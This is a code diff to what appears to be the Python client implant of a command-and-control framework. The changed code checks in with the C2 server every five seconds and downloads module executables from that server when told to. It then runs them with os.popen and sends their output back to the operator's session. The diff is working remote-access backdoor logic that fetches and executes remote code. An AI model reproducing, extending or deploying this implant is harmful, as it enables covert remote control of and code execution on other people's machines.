@@ -12,10 +12,11 @@ To run module: nmap <params>
 
 import json
 import os
+from os import listdir
+from os.path import isfile, join
 import re
 import time
 import uuid
-import zipfile
 
 import requests
 
@@ -66,7 +67,7 @@ def process_response(post_object):
         # C2 is asking to load a module, so we will check if the module is
         # on disk or not, if not then we will download it from the server
         module_name = res_obj['cmdline'].split()[1]
-        path_to_zip_file = "{}\\{}.zip".format(DISK_PATH, module_name)
+        path_to_exe = "{}\\{}.exe".format(DISK_PATH, module_name)
         if module_name in [dI for dI in os.listdir(DISK_PATH) if
                            os.path.isdir(
                                os.path.join(DISK_PATH, dI))]:
@@ -77,21 +78,21 @@ def process_response(post_object):
             print("{} module not loaded.\nDownloading it..".format(
                 module_name))
 
-            with open(path_to_zip_file, 'wb') as file:
+            with open(path_to_exe, 'wb') as file:
                 response = requests.get(C2_MODULES_PATH.format(module_name),
                                         HEADERS)
                 file.write(response.content)
-            with zipfile.ZipFile(path_to_zip_file, 'r') as zip_ref:
-                zip_ref.extractall(DISK_PATH + '\\' + module_name)
-            os.remove(path_to_zip_file)
             send_response(res_obj['session_id'],
                           '{} module loaded and ready to be used'.format(
                               module_name))
     # running specific modules
-    elif len(res_obj) > 1 and res_obj['cmdline'].split()[0] in get_loaded_modules():
-        print('You ran a module')
-        print(res_obj['cmdline'])
-        print('=======')
+    elif len(res_obj) > 1 and '{}.exe'.format(res_obj['cmdline'].split()[0]) in get_loaded_modules():
+        # nmap -sS 127.0.0.0/28 80
+        # print('{}\\{}'.format(DISK_PATH, res_obj['cmdline'].replace(res_obj['cmdline'].split()[0],res_obj['cmdline'].split()[0]+'.exe')))
+        output_module = os.popen('{}\\{}'.format(DISK_PATH, res_obj['cmdline'].replace(res_obj['cmdline'].split()[0], res_obj['cmdline'].split()[0]+'.exe')))
+        # print(output_module.read())
+        send_response(res_obj['session_id'], output_module.read(),
+                      res_obj['cmdline'])
     else:
         # If a command is received
         if len(post_object) != 2:  # means that there is a cmdline
@@ -105,8 +106,7 @@ def process_response(post_object):
 
 def get_loaded_modules():
     root = DISK_PATH
-    return [item for item in os.listdir(root) if
-            os.path.isdir(os.path.join(root, item))]
+    return [f for f in listdir(root) if isfile(join(root, f)) and f.endswith('.exe')]
 
 
 def send_response(sesh_id, output, cmd_given=""):
@@ -135,8 +135,11 @@ def say_hello():
 
 def main():
     while True:
-        say_hello()
-        time.sleep(5)
+        try:
+            say_hello()
+            time.sleep(5)
+        except requests.exceptions.ConnectionError:
+            print('Connection to server cannot be established.')
 
 
 if __name__ == '__main__':
